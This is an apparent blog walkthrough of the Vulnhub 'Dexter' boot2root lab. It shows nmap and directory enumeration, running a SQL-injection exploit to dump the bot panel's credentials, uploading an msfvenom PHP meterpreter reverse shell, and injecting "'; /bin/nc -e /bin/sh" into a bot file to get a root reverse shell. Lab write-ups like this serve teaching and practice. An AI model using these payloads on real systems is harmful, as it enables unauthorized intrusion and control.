@@ -1,0 +1,322 @@
+
+								
+																		Hack the Bot challenge: Dexter (Boot2Root Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges, Kali Linux, Penetration Testing									
+									
+									
+									on April 12, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hi friends! Today we are going to face Bot challenge in new VM machine of vulnhub design by Mr. Brian Wallace. In this tutorial you will how to access root privilege by generating malicious bot. you can download this challenge from here.
+Let’s start!!!
+Open the terminal of Klai Linux to Identify the target in your network using netdiscover command.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+From screenshot you can see the highlighted target IP : 192.168.1.105
+
+Enumerate open port of targeted IP using nmap therefore type following command:
+
+		
+		
+			
+			
+			
+			
+nmap -p- -Pn 192.168.1.105
+			
+				
+					
+				
+					1
+				
+						nmap -p- -Pn 192.168.1.105
+					
+				
+			
+		
+
+From its scanning result we come to know that port 22, 80, 111, 55844 are open ports.
+
+Seeing as port 80 is open I come across towards browser and look at target IP 192.168.1.105. Here the web page was pointing out towards two more different links “Panel” and “Dexter Analysis for a different botnet”.
+When I visit to second link it was redirected to another website and I found this link is not for our use but when I click on “panel” this linked me to a login page.
+
+So now I was at login page and I have no idea for its username: password here I also try sql login form injection but couldn’t breach this login page.
+
+Now next I choose dirbuster for directory brute force attack to step forward in expectation to get some directories inside it.
+
+From screenshot you can perceive the files and directories which I found through brute force attack. Next we need to explore these directories in browser so that we can find our any clue to breach login page.
+
+I start with upload.php where we can upload our malicious file or backdoor as you can see from screenshot I try to upload hacked.php file but nothing happened. Then I try to explore another directory but unable to find any clue regarding this task.
+When I investigate more, then after wasting much I found apart from all directories only gateway.php was suffering from blind SQL injection vulnerable but here the post parameter was encoded with base 64.
+
+Now attacker has two options either configure sqlmap to retrieve credential or download relevant exploit Dexter Casino Loader SQL Injection given by Brian Wallace. I had use this exploit to find out login credential. You can download it from here.
+
+Once you have downloaded it then type following command in terminal:
+
+		
+		
+			
+			
+			
+			
+python 31686.py dump http://192.168.1.106/Panel/gateway.php
+			
+				
+					
+				
+					1
+				
+						python 31686.py dump http://192.168.1.106/Panel/gateway.php
+					
+				
+			
+		
+
+Now you will get login credential for bot panel.
+
+Then I typed above fetched username and password into login form.
+
+The panel has three basic features; bot control, dump viewer, and file upload.  Without wasting time I click on upload options.
+
+Now again I will try to upload php backdoor so that we get reverse connection of target system.
+
+Now use msfvenom to generate malicious PHP script and type following command.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.106 lport=4444 –f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.106 lport=4444 –f raw
+					
+				
+			
+		
+
+From screenshot you can read the generated PHP script, at this instant we need to copy the text highlighted text further we will past it inside text document and saved with shell.php and multi handler inside metasploit.
+
+Now go back to upload directory and upload shell.php now you can see from given image the shell.php file is successfully upload inside /panel/exes.
+
+Here we are going to execute shell.php which gives reverse connection in metasploit framework.
+
+		
+		
+			
+			
+			
+			
+192.168.0.105/panel/exes
+			
+				
+					
+				
+					1
+				
+						192.168.0.105/panel/exes
+					
+				
+			
+		
+
+
+Awesome! We have victim’s metrepreter session
+
+		
+		
+			
+			
+			
+			
+metrepreter &gt; ls
+metrepreter &gt; cd /var/www
+metrepreter &gt; ls
+			
+				
+					
+				
+					123
+				
+						metrepreter &gt; lsmetrepreter &gt; cd /var/wwwmetrepreter &gt; ls
+					
+				
+			
+		
+
+Inside /var/www I found my bot file antitamper.list, now first we will download it
+
+		
+		
+			
+			
+			
+			
+metrepreter &gt;download antitamper.list /root/Desktop
+			
+				
+					
+				
+					1
+				
+						metrepreter &gt;download antitamper.list /root/Desktop
+					
+				
+			
+		
+
+
+Here you can read the downloaded file then add you malicious bot inside it
+
+Now I have add my malicious bot  then upload it again inside /var/www and  start netcat for reverse connection then run antitamper.py
+
+		
+		
+			
+			
+			
+			
+"shell": "'; /bin/nc -e /bin/sh 192.168.1.104 4444 #",
+			
+				
+					
+				
+					1
+				
+						"shell": "'; /bin/nc -e /bin/sh 192.168.1.104 4444 #",
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+nc –nlvp 4444
+id
+			
+				
+					
+				
+					12
+				
+						nc –nlvp 4444id
+					
+				
+			
+		
+
+Hurray!!! We have got root connection.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
